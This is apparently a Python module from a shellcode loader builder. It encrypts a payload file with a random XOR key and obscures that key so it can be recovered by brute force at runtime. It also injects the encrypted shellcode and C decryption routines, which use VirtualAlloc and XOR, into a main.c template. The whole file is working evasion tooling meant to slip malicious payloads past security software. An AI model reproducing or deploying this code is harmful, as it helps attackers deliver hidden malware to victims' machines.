import os
import sys
import random

def desc():
    return "Brute Force Decryption"

def generate_protected_key(key):
    # Generate a random number between 0 and 255 to use as the XOR key
    xor_key = random.randint(0, 255)

    # Encrypt the key using the XOR key, with feedback from the previous byte
    protected_key = bytearray()
    previous_byte = 0

    for byte in key:
        encrypted_byte = byte ^ xor_key ^ previous_byte
        protected_key.append(encrypted_byte)
        previous_byte = encrypted_byte

    return protected_key

def bruteforce(protected_key, hint_byte, hint_byte_pos):
    for xor_key in range(256):
        key = bytearray()
        previous_byte = 0

        for byte in protected_key:
            decrypted_byte = byte ^ xor_key ^ previous_byte
            key.append(decrypted_byte)
            previous_byte = byte

        if key[hint_byte_pos] == hint_byte:
            return key

    print("[!] Key not found.")
    return None

def getPayload():
    filename = './payload.bin'
    try:
        with open(filename, 'rb') as file:
            # Read the entire file
            file_content = file.read()
            return file_content
    except IOError as e:
        print("[!] I/O error({0}): {1}".format(e.errno, e.strerror))
        raise
    
def get_hex_string(data):
    result = ''

    for i in range(0, len(data), 16):
        result += "\t"
        chunk = data[i:i+16]
        for byte in chunk:
            result += f"0x{byte:02x}, "
        result += "\n"

    return result[1:-3]

def xor_by_input_key(payload, key):
    modified_payload = bytearray(len(payload))
    key_size = len(key)
    j = 0
    for i in range(len(payload)):
        if j >= key_size:
            j = 0
        modified_payload[i] = payload[i] ^ key[j]
        j += 1
    return modified_payload

def fill_template(encrypted, protected_key, hint_byte, hint_byte_pos):
    libs = ''' \
#define KEYSIZE		16
'''

    functions = ''' \
unsigned char* bruteforce(unsigned char* protected_key, unsigned char hint_byte, size_t hint_byte_pos) {
    for (int xor_key = 0; xor_key < 256; xor_key++) {
        unsigned char* key = (unsigned char*)malloc(sizeof(unsigned char) * KEYSIZE);
        unsigned char previous_byte = 0;

        for (size_t i = 0; i < KEYSIZE; i++) {
            unsigned char decrypted_byte = protected_key[i] ^ xor_key ^ previous_byte;
            key[i] = decrypted_byte;
            previous_byte = protected_key[i];
        }

        if (key[hint_byte_pos] == hint_byte) {
            return key;
        }

        free(key);
    }

    return NULL;
}

VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
	for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
		if (j >= sKeySize){
			j = 0;
		}
		pShellcode[i] = pShellcode[i] ^ bKey[j];
	}
}
'''

    functions += "\nunsigned char pKey[] = {" + protected_key + "};\nunsigned char protected_key[] = {" + protected_key + "};\nunsigned char hint_byte = {" + hint_byte + "};\nsize_t hint_byte_pos = {" + str(hint_byte_pos) + "};"

    payload_mods = ''' \
    SIZE_T      	sPayloadSize	= sizeof(pPayload);

    // Allocating buffer to hold decrypted shellcode
    PBYTE pShellcode = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Copy encrypted shellcode to decrypted shellcode buffer
    if (pShellcode)
        memcpy(pShellcode, pPayload, sPayloadSize);

    // Bruteforce key
    unsigned char* found_key = bruteforce(protected_key, hint_byte, hint_byte_pos);
    if (found_key != NULL) {
        // Decryption
        XorByInputKey(pShellcode, sPayloadSize, found_key, KEYSIZE);

        free(found_key);
    }
'''

    # Read the content of the input file
    with open("./src/main.c", 'r') as file:
        content = file.read()

    # Replace the template
    modified_content = content.replace("{{LIBS}}", libs + "\n{{LIBS}}") \
                              .replace("{{FUNCTIONS}}", functions + "\n{{FUNCTIONS}}") \
                              .replace("{{PAYLOAD}}", encrypted) \
                              .replace("{{PAYLOAD_MODS}}", payload_mods)

    # Write the modified content to the output file
    with open("./src/main.c", 'w') as file:
        file.write(modified_content)

def run():
    original_data = getPayload()

    # Generate random key (size 16)
    key = bytearray(random.randint(0, 255) for _ in range(16))
    key_str = ", ".join([f"0x{byte:02x}" for byte in key])

    # Choose random number between 0 and the key size
    hint_byte_pos = random.randint(0, 15)
    hint_byte = key[hint_byte_pos]
    hint_byte_str = f"0x{hint_byte:02x}"

    # Encrypt key
    protected_key = generate_protected_key(key)
    protected_key_str = ", ".join([f"0x{byte:02x}" for byte in protected_key])

    # Encrypt data
    encrypted_data = xor_by_input_key(bytearray(original_data), key)
    encrypted_str = get_hex_string(encrypted_data)

    # Fill template
    fill_template(encrypted_str, protected_key_str, hint_byte_str, hint_byte_pos)

    return